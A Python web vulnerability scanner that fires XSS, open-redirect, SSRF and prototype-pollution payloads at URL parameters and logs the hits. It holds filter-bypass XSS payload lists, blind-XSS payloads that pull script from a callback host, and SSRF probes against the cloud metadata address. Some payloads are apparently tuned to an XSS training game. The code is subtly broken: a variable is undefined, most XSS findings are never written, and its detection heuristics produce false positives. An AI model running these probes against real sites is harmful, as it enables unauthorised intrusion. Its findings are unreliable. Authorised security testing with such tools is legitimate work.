#!/usr/bin/env python3
import asyncio, aiohttp, json, re, hashlib, time, os, sys, sqlite3, urllib.parse
from pathlib import Path
from urllib.parse import urlparse, urlencode, urlunparse, parse_qsl
sys.path.append(str(Path(__file__).resolve().parents[1]))
from modules.paramgraph import build as build_params
from modules.collaborator_client import CollaboratorClient, CollaboratorConfig

BASE_DIR = Path(__file__).resolve().parents[1]
CONFIG = json.loads((BASE_DIR / "config.json").read_text(encoding="utf-8"))
FINDINGS = BASE_DIR / "findings.jsonl"
STATE_DB = BASE_DIR / ".deep_ttl.sqlite"
CONCURRENCY = int(CONFIG.get("max_probe_concurrency", 120))

TTL_HOURS = int(CONFIG.get("rescan_ttl_hours", 24))

def _stable_id(f: dict) -> str:
    key = "|".join([
        str(f.get("endpoint","")),
        str(f.get("method","GET")),
        str(f.get("param","")),
        str(f.get("vuln_type","")),
        str(f.get("payload",""))[:128],
    ])
    return hashlib.sha256(key.encode("utf-8")).hexdigest()

def _write_finding(f: dict):
    f.setdefault("ts", time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()))
    f.setdefault("stable_id", _stable_id(f))
    with FINDINGS.open("a", encoding="utf-8") as fp:
        fp.write(json.dumps(f, ensure_ascii=False) + "\n")

def _db():
    return sqlite3.connect(STATE_DB)

def _should_probe(key: str, ttl_hours: int = TTL_HOURS) -> bool:
    os.makedirs(STATE_DB.parent, exist_ok=True)
    with _db() as db:
        db.execute("CREATE TABLE IF NOT EXISTS probe_gate (k TEXT PRIMARY KEY, ts REAL)")
        row = db.execute("SELECT ts FROM probe_gate WHERE k=?", (key,)).fetchone()
        now = time.time()
        if row:
            last = row[0]
            if now - last < ttl_hours*3600:
                return False
        db.execute("INSERT OR REPLACE INTO probe_gate(k, ts) VALUES (?, ?)", (key, now))
    return True

def _set_param(url: str, name: str, value: str) -> str:
    u = urlparse(url)
    q = parse_qsl(u.query, keep_blank_values=True)
    for i, (k, v) in enumerate(q):
        if k == name:
            q[i] = (k, value)
            break
    else:
        q.append((name, value))
    return urlunparse((u.scheme, u.netloc, u.path, u.params, urlencode(q, doseq=True), u.fragment))

# ---- Advanced Payload families ----
def xss_payloads(collab: CollaboratorClient, scope: str, param_name: str = ""):
    # Basic reflected XSS payloads
    base = [
        '"><svg/onload=alert(1)>',
        '\'><img src=x onerror=alert(1)>',
        '"><script>alert(1)</script>',
        '" autofocus onfocus=alert(1) x="',
        "jaVasCript:alert(1)",
    ]
    
    # Level 2 specific - bypasses script tag filtering
    level2_payloads = [
        "<img src/onerror=alert(1)>",  # Key Level 2 technique
        "<svg onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
    ]
    
    # Level 3 DOM XSS - fragment injection with comment bypass
    level3_payloads = [
        "1' onerror='alert(1)';//",  # Key Level 3 technique  
        "1' onload='alert(1)';//",
        "1' onclick='alert(1)';//",
        "' onerror='alert(1)' src='x",
    ]
    
    # Level 4 - Timer function injection 
    level4_payloads = [
        "3';alert(1);//",  # Key Level 4 technique
        "1');alert(1);//", 
        "3'*alert(1);//",
        "1'+alert(1)+'1",
    ]
    
    # JavaScript protocol injection (Level 5 technique)
    js_protocol_payloads = [
        "javascript:alert(1)",
        "javascript:alert('XSS')",
        "javascript://alert(1)", 
        "Javascript:alert(1)",  # Case bypass
        "JAVASCRIPT:alert(1)",  # Case bypass
        "data:text/html,<script>alert(1)</script>",
        "vbscript:alert(1)",
    ]
    
    # Advanced XSS techniques for different contexts
    advanced = [
        # JavaScript context breaking
        "');alert(1);//",
        "';alert(1);//", 
        "';alert(1);var x='",
        
        # Attribute context
        "x' onclick='alert(1)' x='",
        "x\" onclick=\"alert(1)\" x=\"",
        
        # URL context
        "data:text/html,<script>alert(1)</script>",
        
        # Filter bypass attempts
        "<svg><script>alert&#40;1&#41;</script></svg>",
        "<img src=x onerror=alert&#x28;1&#x29;>",
        "<<script>alert(1)</script>",
        "<script>alert(String.fromCharCode(49))</script>"
    ]
    
    # Add payloads based on parameter context
    if param_name:
        if param_name in ["timer"]:
            base.extend(level4_payloads)
        elif param_name in ["next", "redirect", "url"]:
            base.extend(js_protocol_payloads)
        elif param_name in ["content", "message", "action"]:
            base.extend(level2_payloads)
    
    base.extend(level2_payloads + level3_payloads + level4_payloads + js_protocol_payloads + advanced)
    
    # Add blind XSS payloads if collaborator available
    if collab and collab.is_enabled():
        o = collab.http_url("bxss", scope)
        base += [
            f'"><img src={o}>',
            f'"><script src={o}></script>',
            f"<script>fetch('{o}')</script>",
            f"<img src=x onerror=fetch('{o}')>"
        ]
    return base

def open_redirect_payloads():
    return ['https://google.com', '//evil.example.com', '///google.com', '////@google.com']

def ssrf_payloads(collab: CollaboratorClient, scope: str):
    out = []
    if collab and collab.is_enabled():
        out.append(collab.http_url("ssrf", scope))
    # fallback patterns (sometimes leak outward via DNS prefetching)
    out += ["http://127.0.0.1:80/", "http://169.254.169.254/latest/meta-data/"]
    return out

def proto_pollution_params():
    # URL query variants that some servers/frameworks decompose
    return ["__proto__[polluted]", "constructor.prototype.polluted"]

REDIRECT_HINT = re.compile(r'(redir|redirect|next|dest|url|uri|target|to|continue|return)', re.I)
SSRF_HINT = re.compile(r'(url|uri|path|dest|endpoint|feed|image|file|download|fetch|next|callback|u)', re.I)

# ---- Probes ----
async def probe_xss(session, base_url, endpoint, param, scope):
    """Advanced XSS detection with context analysis"""
    for payload in xss_payloads(COLLAB, scope, param):
        key = f"{endpoint}|GET|{param}|xss|{hashlib.md5(payload.encode()).hexdigest()[:6]}"
        if not _should_probe(key): 
            continue
        
        # Test both regular parameter and action-based stored XSS
        test_urls = [_set_param(base_url, param, payload)]
        
        # Level 2 pattern: Add action=create parameter for stored XSS  
        if param in ["content", "message", "text", "body"]:
            stored_url = _set_param(base_url, "action", "create")
            stored_url = _set_param(stored_url, param, payload)
            test_urls.append(stored_url)
        
        for url in test_urls:
            try:
                async with session.get(url, timeout=12) as r:
                    text = await r.text(errors='ignore')
                    
                    # Skip error pages (404, 403, etc.)
                    if r.status >= 400:
                        continue
                    
                    # Advanced XSS detection
                    xss_found = False
                    evidence = ""
                    confidence = 0.7
                    xss_type = "reflected"
                    
                    # Stored XSS detection (generic pattern)
                    if any(action_keyword in url.lower() for action_keyword in ["action=create", "action=post", "submit", "save"]):
                        if payload in text and any(store_indicator in text.lower() for store_indicator in [
                            "create", "posted", "message", "chat", "comment", "saved", "added"
                        ]):
                            xss_found = True
                            evidence = f"Stored XSS detected: {payload}"
                            confidence = 0.90
                            xss_type = "stored"
                    
                    # JavaScript protocol/URL validation bypass detection  
                    elif REDIRECT_HINT.search(param) and any(scheme in payload.lower() for scheme in [
                        "javascript:", "data:", "vbscript:"
                    ]):
                        # Enhanced detection for JavaScript protocol injection
                        js_protocol_indicators = [
                            payload in text,
                            "javascript:" in text.lower(),
                            f"href='{payload}'" in text,
                            f'href="{payload}"' in text,
                            any(js_exec in text for js_exec in ["alert(", "eval(", "confirm("]),
                            # Level 5 specific: next button with javascript protocol
                            "next" in text.lower() and "javascript:" in payload.lower()
                        ]
                        
                        if any(js_protocol_indicators):
                            xss_found = True
                            evidence = f"JavaScript protocol XSS: {payload}"
                            confidence = 0.95
                            xss_type = "js_protocol"
                    
                    # Check for direct payload reflection
                    elif payload in text:
                        xss_found = True
                        evidence = _extract_reflection_context(text, payload)
                        confidence = 0.85
                    
                    # Check for JavaScript execution context
                    elif any(js_indicator in text.lower() for js_indicator in ['alert(1)', 'alert&#40;1&#41;', 'alert&#x28;1&#x29;']):
                        xss_found = True
                        evidence = "JavaScript execution detected in response"
                        confidence = 0.95
                    
                    # Check for HTML context injection
                    elif any(html_tag in text for html_tag in ['<script', '<img', '<svg', '<iframe']):
                        if any(attr in text for attr in ['onerror=', 'onload=', 'onclick=', 'onfocus=']):
                            xss_found = True
                            evidence = "HTML injection with event handler detected"
                            confidence = 0.90
                    
                    # Check for attribute context breaking
                    elif re.search(r"['\"].*alert.*['\"]", text):
                        xss_found = True
                        evidence = "Attribute context breaking detected"
                        confidence = 0.80
                    
                    # Check for URL context injection
                    elif any(url_scheme in text for url_scheme in ['javascript:', 'data:text/html']):
                        xss_found = True
                        evidence = "URL context injection detected"
                        confidence = 0.85
                    
                    if xss_found:
                        # Use specific type if already determined, else classify
                        if xss_type == "reflected":
                            xss_type = _classify_xss_type(text, payload, url)
                        
                            _write_finding({
                                "category":"XSS","severity":"high","endpoint":endpoint,"method":"GET",
                                "param":param,"payload":payload,"evidence":evidence,
                                "target":base_url,"vuln_type":f"xss_{xss_type}","tags":["reflect"],
                                "confidence": confidence
                            })
                            break  # Found XSS, no need to test more payloads for this param
                            
            except Exception:
                continue

async def probe_fragment_xss(session, base_url, endpoint, scope):
    """Test for fragment-based DOM XSS (Level 3 & 6 techniques)"""
    # Level 3 DOM XSS payloads - attribute breaking for choosetab function
    level3_payloads = [
        "1' onerror='alert(1)';//",
        "cloud1' onerror='alert(1)';//",
        "' onerror='alert(1)' src='x",
        "1' onload='alert(1)';//",
    ]
    
    # Level 6 external script payloads for includeGadget
    level6_payloads = [
        "data:text/javascript,alert(1)",
        "data:application/javascript,alert(1)",
        f"{base_url}#data:text/javascript,alert(1)",
    ]
    
    all_payloads = level3_payloads + level6_payloads
    
    for payload in all_payloads:
        key = f"{endpoint}|FRAGMENT|xss|{hashlib.md5(payload.encode()).hexdigest()[:6]}"
        if not _should_probe(key):
            continue
            
        # Test with fragment
        fragment_url = f"{base_url}#{urllib.parse.quote(payload)}"
        try:
            async with session.get(fragment_url, timeout=12) as r:
                text = await r.text(errors='ignore')
                
                # Generic DOM XSS detection via hash processing
                dom_xss_indicators = ['location.hash', 'window.location.hash', 'document.location.hash']
                js_functions = ['choosetab', 'settab', 'loadtab', 'switchtab', 'navigate', 'load']
                
                if any(indicator in text for indicator in dom_xss_indicators):
                    if any(func in text.lower() for func in js_functions):
                        if any(event in payload for event in ["onerror=", "onload=", "onclick=", "onfocus="]):
                            _write_finding({
                                "category":"XSS","severity":"high","endpoint":endpoint,"method":"GET",
                                "param":"fragment","payload":payload,
                                "evidence":f"DOM XSS via hash processing: {payload}",
                                "target":base_url,"vuln_type":"xss_dom","tags":["fragment","hash"],
                                "confidence": 0.90
                            })
                            continue
                
                # Generic script loading/gadget XSS detection
                script_loaders = ['includegadget', 'loadscript', 'include', 'import', 'require']
                if any(loader in text.lower() for loader in script_loaders):
                    if any(scheme in payload.lower() for scheme in ['data:', 'javascript:', 'http']):
                        _write_finding({
                            "category":"XSS","severity":"high","endpoint":endpoint,"method":"GET",
                            "param":"fragment","payload":payload,
                            "evidence":f"Script gadget XSS via external loading: {payload}",
                            "target":base_url,"vuln_type":"xss_gadget","tags":["fragment","gadget"],
                            "confidence": 0.90
                        })
                        continue
                        
        except Exception:
            continue

def _extract_reflection_context(text, payload):
    """Extract context around payload reflection"""
    lines = text.split('\n')
    for line in lines:
        if payload in line:
            return f"Reflected in: {line.strip()[:150]}"
    return f"Payload reflected: {payload}"

def _classify_xss_type(text, payload, url):
    """Classify the type of XSS based on context"""
    text_lower = text.lower()
    
    # DOM-based XSS indicators (client-side processing)
    dom_indicators = ['location.hash', 'window.location', 'document.location', 'innerhtml', 'document.write']
    if '#' in url or any(indicator in text for indicator in dom_indicators):
        return "dom"
    
    # Stored XSS indicators (persistent storage)
    storage_indicators = ['action=create', 'action=post', 'submit', 'save', 'store']
    stored_content_indicators = ['posted', 'saved', 'added', 'created', 'comment', 'message']
    if (any(indicator in url.lower() for indicator in storage_indicators) or 
        any(indicator in text_lower for indicator in stored_content_indicators)):
        return "stored"
    
    # JavaScript execution context (within script tags or functions)
    js_context_indicators = ['settimeout', 'setinterval', 'eval(', 'function', 'var ', 'let ', 'const ']
    if any(indicator in text_lower for indicator in js_context_indicators):
        # Check if payload appears within JavaScript context
        js_pattern = r'<script[^>]*>.*?' + re.escape(payload) + r'.*?</script>'
        if re.search(js_pattern, text, re.DOTALL | re.IGNORECASE):
            return "js_context"
    
    # Attribute context (payload within HTML attributes)
    attr_pattern = r'<[^>]*\s+[^=]*=[\'"]*[^\'">]*' + re.escape(payload)
    if re.search(attr_pattern, text, re.IGNORECASE):
        return "attribute"
    
    # URL/href context
    if any(scheme in payload.lower() for scheme in ['javascript:', 'data:', 'vbscript:']):
        return "url_context"
    
    # Default reflected XSS
    return "reflected"

async def probe_open_redirect(session, base_url, endpoint, param):
    if not REDIRECT_HINT.search(param):
        return
    for payload in open_redirect_payloads():
        key = f"{endpoint}|GET|{param}|redir|{payload}"
        if not _should_probe(key): 
            continue
        url = _set_param(base_url, param, payload)
        try:
            async with session.get(url, allow_redirects=False, timeout=10) as r:
                loc = r.headers.get('location','')
                if r.status in (301,302,303,307,308) and (loc.startswith('//') or loc.startswith('http')):
                    _write_finding({
                        "category":"Open Redirect","severity":"medium","endpoint":endpoint,"method":"GET",
                        "param":param,"payload":payload,"evidence":f"{r.status} -> {loc}",
                        "target":base_url,"vuln_type":"open_redirect","tags":[]
                    })
        except Exception:
            continue

async def probe_ssrf(session, base_url, endpoint, param, scope):
    if not SSRF_HINT.search(param):
        return
    for payload in ssrf_payloads(COLLAB, scope):
        key = f"{endpoint}|GET|{param}|ssrf|{hashlib.md5(payload.encode()).hexdigest()[:6]}"
        if not _should_probe(key): 
            continue
        url = _set_param(base_url, param, payload)
        try:
            async with session.get(url, timeout=12, ssl=False) as r:
                # often no inline proof; OOB/infra logs confirm
                _write_finding({
                    "category":"SSRF","severity":"high","endpoint":endpoint,"method":"GET",
                    "param":param,"payload":payload,"evidence":"issued (check OOB/infra)",
                    "target":base_url,"vuln_type":"ssrf","tags":["oob"] if (COLLAB and COLLAB.is_enabled()) else []
                })
        except Exception:
            continue

async def probe_proto_pollution(session, base_url, endpoint):
    for p in proto_pollution_params():
        key = f"{endpoint}|GET|{p}|proto|1"
        if not _should_probe(key): 
            continue
        url = _set_param(base_url, p, "1")
        try:
            async with session.get(url, timeout=10) as r:
                hdrs = " ".join([f"{k}:{v}" for k,v in r.headers.items()])
                if "polluted" in hdrs.lower():
                    _write_finding({
                        "category":"Prototype Pollution","severity":"medium","endpoint":endpoint,"method":"GET",
                        "param":p,"payload":"1","evidence":"header reflection of polluted",
                        "target":base_url,"vuln_type":"prototype_pollution","tags":[]
                    })
        except Exception:
            continue

# ---- Param discovery & runbook ----
async def fetch_text(session, url):
    try:
        async with session.get(url, timeout=10) as r:
            if r.status >= 400:
                return ""
            return await r.text(errors='ignore')
    except Exception:
        return ""

async def process_url(session, url):
    u = urlparse(url)
    endpoint = u.path or "/"
    scope = u.netloc
    html = await fetch_text(session, url)
    # extract <script> blobs lightly
    js_blobs = re.findall(r'<script[^>]*>(.*?)</script>', html or "", re.I | re.S)
    params = build_params(url, html, js_blobs)
    
    # Add intelligent parameter discovery based on URL patterns and content
    additional_params = []
    
    # Look for common web app parameter patterns
    if any(pattern in url.lower() for pattern in ["level", "game", "challenge"]):
        additional_params.extend(["query", "content", "message", "next", "timer", "email"])
    
    # Look for stored content indicators
    if any(indicator in html.lower() for indicator in ["chat", "post", "comment", "message"]):
        additional_params.extend(["action", "content", "message", "text", "body"])
    
    # Look for redirect/navigation indicators  
    if any(indicator in html.lower() for indicator in ["next", "continue", "redirect", "signup"]):
        additional_params.extend(["next", "continue", "redirect", "url", "goto"])
    
    # Look for timer/delay functionality
    if any(indicator in html.lower() for indicator in ["timer", "delay", "timeout", "settimeout"]):
        additional_params.extend(["timer", "delay", "seconds", "time"])
    
    params.extend(additional_params)
    params = list(set(params))  # Remove duplicates
    
    # Only use fallbacks if we find NO parameters and the page looks interactive
    if not params and html and ("form" in html.lower() or "input" in html.lower()):
        params = ["q","search","id"]  # minimal fallbacks for interactive pages
    elif not params and not xss_game_params:
        # No parameters found and page doesn't look interactive - skip testing
        return

    # run probes
    tasks = []
    for p in params:
        tasks.append(probe_xss(session, url, endpoint, p, scope))
        tasks.append(probe_open_redirect(session, url, endpoint, p))
        tasks.append(probe_ssrf(session, url, endpoint, p, scope))
    
    # Add fragment-based XSS testing for DOM XSS scenarios
    tasks.append(probe_fragment_xss(session, url, endpoint, scope))
    tasks.append(probe_proto_pollution(session, url, endpoint))
    await asyncio.gather(*tasks, return_exceptions=True)

# ---- CLI ----
def load_collab():
    cfg = CONFIG.get("collaborator", {}) or {}
    c = CollaboratorConfig(
        enabled=bool(cfg.get("enabled", False)),
        base_domain=str(cfg.get("base_domain","")),
        auth_token=str(cfg.get("auth_token","")),
        https=bool(cfg.get("https", True)),
    )
    return CollaboratorClient(c)

COLLAB = load_collab()

async def main():
    import argparse
    ap = argparse.ArgumentParser(description="Deep scanner (ParamGraph + TTL de-dupe)")
    ap.add_argument("--in", dest="infile", required=True, help="File with URLs (one per line)")
    ap.add_argument("--concurrency", type=int, default=CONCURRENCY)
    args = ap.parse_args()

    urls = [x.strip() for x in Path(args.infile).read_text(encoding="utf-8").splitlines() if x.strip() and not x.strip().startswith("#")]
    sem = asyncio.Semaphore(args.concurrency)
    async with aiohttp.ClientSession() as session:
        async def run(u):
            async with sem:
                await process_url(session, u)
        await asyncio.gather(*(run(u) for u in urls), return_exceptions=True)

if __name__ == "__main__":
    asyncio.run(main())